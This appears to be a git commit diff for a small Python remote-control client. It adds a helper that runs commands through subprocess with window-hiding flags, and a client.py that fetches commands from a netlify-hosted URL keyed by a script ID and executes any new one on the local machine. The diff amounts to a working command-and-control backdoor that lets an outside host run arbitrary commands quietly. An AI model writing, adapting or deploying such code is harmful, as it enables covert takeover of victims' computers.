0278a21d0b653b70548995be44b1b09b7d9558fc
agentswagt <shagatoc@gmail.com>
2021-07-05 22:07:30 +0600

    commited by pusher 1213123

---
+++ allfunction.py
@@ -0,0 +1,22 @@
+
+
+
+
+def comexesilent(command):
+    import subprocess
+    si = subprocess.STARTUPINFO()
+    si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+    #si.wShowWindow = subprocess.SW_HIDE # default
+    subprocess.call(command, startupinfo=si)
+
+
+def repeatchecker(command_number_online):
+    last_code = open("last_code", "r").readline()
+    print(last_code)
+    new_code = command_number_online
+    print(new_code)
+    if last_code == str(new_code):
+        return True
+    else:
+        return False
+
--- client.py
+++ client.py
@@ -3,47 +3,46 @@ import os
 import requests
 import subprocess
 import time
+import allfunction
+"""
+Code        Type
+----        -----
+4444        One time Command
+6666        Looped Command
+9999        For shutdown Script
+"""
 
-script_id_number = 596
 
-while True:
-    #local command number scanner
-    with open("new_command", "r") as local_command_scanner:
-        local_command_scanner_var = local_command_scanner.readline()[0:4]
-     
-    
+script_id_number = 456
 
-    new_command_url = f"https://rcu-d.netlify.app/order/{script_id_number}"
-    new_command = requests.get(new_command_url).text
 
-    #online loaded command code
-
-    command_number_online = new_command[0:4]
-    
-
-    #cutting down the command number from main command
-
-    new_command = new_command
-    new_command = new_command.replace(command_number_online, "")
-    
-    
-    if local_command_scanner_var == command_number_online:
-
-        with open("new_command", "w") as command_container:
-            command_container.write(str(new_command))
-            command_container.close()
-        loaded_command = open("new_command", "r").readline()
-        loaded_command = str(loaded_command)
-
-        print(loaded_command)
-        si = subprocess.STARTUPINFO()
-        si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
-        #si.wShowWindow = subprocess.SW_HIDE # default
-        subprocess.call(loaded_command, startupinfo=si)
-        print("Command Executed")
-    else:
-        print("No loaded Command")
-        continue
 
     
+    
+
+new_command_url = f"https://rcu-d.netlify.app/order/{script_id_number}"
+new_command = requests.get(new_command_url).text
+
+#online loaded command code
+
+command_number_online = new_command[0:4] #the important code
+code_status = allfunction.repeatchecker(command_number_online)
+
+
+#cutting down the command number from main command
+
+new_command = new_command
+new_command = new_command.replace(command_number_online, "")
+print(new_command)
+
+if code_status is False:
+    allfunction.comexesilent(new_command)
+    print("command executed")
+else:
+    print("no new command")    
+#command number online will be replaced on last_code file
+
+with open("last_code", "w") as replacer:
+    replacer.write(str(command_number_online))
+    replacer.close()
 
